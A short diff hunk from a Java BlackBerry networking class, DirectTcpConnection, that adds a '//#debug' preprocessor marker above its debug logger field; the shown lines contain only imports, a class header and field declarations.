@@ -17,6 +17,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class DirectTcpConnection extends Connection {
+	//#debug
     static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);
 
     private String host;
